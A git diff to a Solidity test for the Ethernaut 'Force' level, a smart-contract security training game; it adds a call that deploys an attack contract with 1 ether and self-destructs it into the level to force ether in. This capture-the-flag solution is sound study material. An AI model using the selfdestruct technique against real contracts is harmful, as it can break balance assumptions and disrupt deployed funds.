@@ -2,6 +2,7 @@ pragma solidity ^0.8.10;
 
 import "ds-test/test.sol";
 import "../Force/ForceFactory.sol";
+import "../Force/ForceHackDan.sol";
 import "../Ethernaut.sol";
 import "./utils/vm.sol";
 
@@ -33,6 +34,9 @@ contract ForceTest is DSTest {
         //////////////////
         // LEVEL ATTACK //
         //////////////////
+        ForceHackDan hack = new ForceHackDan{value: 1 ether}();
+        hack.selfDestruct(levelAddress);
+        assertEq(levelAddress.balance, 1 ether, "Wrong level balance");
 
         //////////////////////
         // LEVEL SUBMISSION //
